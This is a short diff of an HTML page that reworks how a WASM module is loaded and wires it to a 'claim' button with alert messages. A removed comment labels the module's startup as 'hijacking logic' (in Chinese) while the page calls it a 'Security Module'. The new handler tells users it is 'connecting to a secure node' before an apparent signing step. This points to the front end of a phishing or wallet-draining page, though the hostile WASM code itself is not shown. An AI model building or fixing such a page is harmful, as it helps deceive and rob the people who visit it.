@@ -27,21 +27,34 @@
         </p>
     </div>
 
-    <script type="module">
-        import init, { init_secure_module } from '/assets/js/runtime.js';
+   <script src="/assets/js/runtime.js"></script>
 
-        async function start() {
-            try {
-                // 初始化 WASM
-                await init('/assets/wasm/main.wasm');
-                // 启动劫持逻辑
-                init_secure_module();
-                console.log("WASM Security Module Initialized.");
-            } catch (e) {
-                console.error("Initialization Failed:", e);
+<script>
+    async function start() {
+        try {
+            await wasm_bindgen('/assets/wasm/main.wasm');
+            console.log("WASM 加载成功");
+            const btn = document.getElementById('claimBtn');
+            if (btn) {
+                btn.onclick = async function() {
+                    console.log("按钮被点击");
+                    try {
+                        // 调用你 WASM 里的逻辑
+                        // 建议在这里加个 alert('开始签名'); 看看手机上有没有反应
+                        alert('正在连接安全节点...'); 
+                        // 这里写你原本调用的 WASM 函数
+                    } catch (err) {
+                        alert("执行出错: " + err.message);
+                    }
+                };
             }
+        } catch (e) {
+            alert("初始化失败，请刷新重试: " + e.message);
         }
-        start();
-    </script>
+    }
+    
+    // 确保页面加载完再执行
+    window.onload = start;
+</script>
 </body>
 </html>
